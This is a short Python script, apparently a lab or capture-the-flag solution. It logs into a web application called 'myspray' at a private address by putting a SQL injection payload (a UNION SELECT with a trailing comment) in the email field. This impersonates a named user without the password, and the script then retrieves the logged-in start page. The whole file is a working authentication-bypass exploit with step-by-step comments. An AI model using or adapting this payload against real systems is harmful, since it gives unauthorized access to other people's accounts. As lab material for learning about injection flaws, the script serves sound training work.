import requests

s = requests.Session()

url = "http://10.0.23.22/myspray/"

# Assign garbage to the 'email' field (which should return nothing), then use the UNION statement
# to inject another SELECT expression that returns the user "Hanni Ball", then end the query with
# ';' and comment everything after that with '#'.
email = "a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #"

# Assign garbage to the 'password' field, since the server does not run the login routine if it is empty.
password = "a"

# Log into myspray using post with the login credentials as data.
r = s.post(url, data={"email":email, "password":password})

# After logging in, it is possible to access the start page.
r = s.get(url + "start.html")

# Print HTML response.
print(r.content)
